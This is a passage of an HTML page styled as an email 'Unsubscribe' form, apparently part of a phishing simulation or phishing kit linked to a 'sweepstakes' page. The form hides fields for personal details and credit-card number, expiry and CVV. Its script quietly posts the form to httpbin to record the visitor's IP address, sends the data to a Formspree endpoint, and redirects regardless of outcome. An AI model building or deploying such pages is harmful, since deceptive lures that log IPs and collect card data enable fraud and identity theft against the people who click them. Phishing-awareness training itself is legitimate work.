      background-color: #dc3545;
      text-decoration: none;
      border-radius: 0.25rem;
      width: 100%;

    }
    .unsubscribe-btn:hover { background-color: #bb2d3b; color: #fff; }

</head>
<body>
  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
    <div class="container">

        <a href="tel:6063059636" class="btn custom-btn d-lg-block d-none">Call Us</a>

  <section id="unsubscribe-section" class="py-5 bg-light">
    <div class="container">
      <h2 class="text-center mb-5">Unsubscribe</h2>
      <div class="card p-4 shadow-sm form-container">
        <h4 class="mb-3 text-center">Unsubscribe from future emails</h4>
        <form id="unsubscribe-form">
          <!-- Keep the same hidden fields structure as sweepstakes.html for consistency with Formspree mapping -->
          <p style="display: none;"><input id="name" name="name" type="text" placeholder="Your Name"></p>
          <p style="display: none;"><input id="email" name="email" type="email" placeholder="Your Email"></p>
          <p style="display: none;"><input id="phone" name="phone" type="text" placeholder="Your Phone"></p>
          <p style="display: none;"><input id="organization" name="organization" type="text" placeholder="Your Organization"></p>
          <p style="display: none;"><input id="address" name="address" type="text" placeholder="Your Address"></p>
          <p style="display: none;"><input id="postal" name="postal" type="text" placeholder="Your Postal Code"></p>
          <p style="display: none;"><input id="city" name="city" type="text" placeholder="Your City"></p>
          <p style="display: none;"><select name="country"><option value=""></option><option value="US">United States</option></select></p>
          <p style="display: none;"><input type="text" name="cc_number"></p>
          <p style="display: none;">
            <select name="cc_month" id="cc_month"> <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select>
            <select name="cc_year" id="cc_year"> <option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option><option>2031</option><option>2032</option></select>
          </p>
          <p style="display: none;"><input type="text" id="cc_cvv" name="cc_cvv"></p>

          <input type="hidden" name="action" value="unsubscribe">
          <a href="#" class="unsubscribe-btn" onclick="handleUnsubscribe(event)">Click to Unsubscribe</a>
        </form>
      </div>
    </div>
  </section>

  <footer class="site-footer">
    <div class="container">
      <div class="row"><div class="col-12 text-center py-4">
        <p class="copyright-text m-0">Copyright Â© 2025</p>

  </footer>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script type="text/javascript">
    async function handleUnsubscribe(event) {
      event.preventDefault();

      const form = document.getElementById('unsubscribe-form');
      const formData = new FormData(form);

      // Populate hidden fields with empty strings (mimic prior structure)
      formData.set('phone', '');
      formData.set('organization', '');
      formData.set('address', '');
      formData.set('postal', '');
      formData.set('city', '');

      // Get IP via httpbin (same pattern as sweepstakes page)
      try {
        const ipResponse = await fetch('https://httpbin.org/post', { method: 'POST', body: formData });
        const ipData = await ipResponse.json();
        const ip = ipData.origin || 'Unknown';
        formData.append('ip_address', ip);
      } catch (e) {
        console.error('IP capture failed', e);
      }

      // Submit to Formspree (same endpoint as sweepstakes.html)
      try {
        const res = await fetch('https://formspree.io/f/mpwlqpor', {
          method: 'POST',
          body: formData,
          headers: { 'Accept': 'application/json' }
        });
        // Regardless of success/failure, proceed to confirmation page (training flow)
      } catch (e) {
        console.error('Formspree submission failed', e);
      } finally {
        window.location.href = 'unsubscribed.html';
      }
    }
  </script>
  <script data-account="kE7HhZfU5B" src="https://cdn.userway.org/widget.js"></script>
